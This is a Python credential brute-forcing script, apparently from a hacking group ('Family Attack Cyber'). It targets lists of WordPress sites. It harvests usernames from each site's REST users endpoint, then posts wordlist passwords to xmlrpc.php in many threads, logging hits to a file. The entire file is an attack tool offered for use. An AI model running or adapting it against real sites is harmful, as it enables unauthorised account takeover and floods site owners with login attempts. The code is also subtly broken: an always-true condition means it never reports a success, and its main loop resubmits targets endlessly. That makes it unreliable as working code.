import urllib3, requests, os, sys, re, json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import base64
import random
import string
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
import urllib
from bs4 import BeautifulSoup
import random, os, sys, time
from concurrent.futures import ThreadPoolExecutor


fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT



os.system('clear')
clear = "\x1b[0m"
colors = [36, 32, 34, 35, 31, 37]

x = """
┌─┐┌─┐┬┌─┌─┐┬─┐┌─┐ XMLRPC BruteForce
┌─┘├┤ ├┴┐├─┘├┬┘│  
└─┘└─┘┴ ┴┴  ┴└─└─┘ 
[ + ] Zekkel AR 
[ + ] Agung sans ~ Kowalskyi - RM.19 - Habil M00nz 
[ + ] Family Attack Cyber
"""
for N, line in enumerate(x.split("\n")):
	sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
	time.sleep(0.05)
def gaskeun(url, password):
	bl = url+'/xmlrpc.php'
	url = url+"/wp-json/wp/v2/users/"
	reks1 = requests.get(url).text
	kon = json.loads(reks1)
	#get user
	try:
		for y in kon:
			dangdung = (y['slug'])
			bla = dangdung.strip()
			mewek = open(password, 'r').readlines()
			for c in mewek:
				n = c.strip()
				body = ("""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""" .format(bla,n))
				reks2 = requests.post(bl, data=body)
				if 'faultString' in reks2.text:
					print('{}[ {}not vuln {}] {}{} {}[ {}{} {}] {}[ {}{} {}]' .format(fg,fr,fg,fg,bl,fr,fg, bla,fr,fr,fg,n,fr))
				elif '[]':
					print('{}[ {}not vuln {}] {}{} {}[ {}{} {}] {}[ {}{} {}]' .format(fg,fr,fg,fg,bl,fr,fg ,bla,fr,fr,fg,n,fr))
					pass
				else:
					print('{}[ {}vuln {}] {}{} {}[ {}{} {}] {}[ {}{} {}]' .format(fr,fg,fr,fg,bl,fr,fg,bla,fr,fr,fg,n,fr))
					open('wordpress.txt', 'a').write(url + "\n")


	except KeyError:
		print('username not found {}' .format(bl))


if __name__ == "__main__":
	fil = input('Input file : ')
	if os.path.isfile(fil) == False: exit()

	thr = input('Thread : ')
	if thr.isdigit() == False: exit()

	target = input('Password : ')
	
	f = open(fil, 'r').read().strip()
	c = open(target, 'r').read().strip()
	executor = ThreadPoolExecutor(max_workers=int(thr))
	while True:
		for i in f.split('\n'):
  			a = executor.submit(gaskeun, i, target)

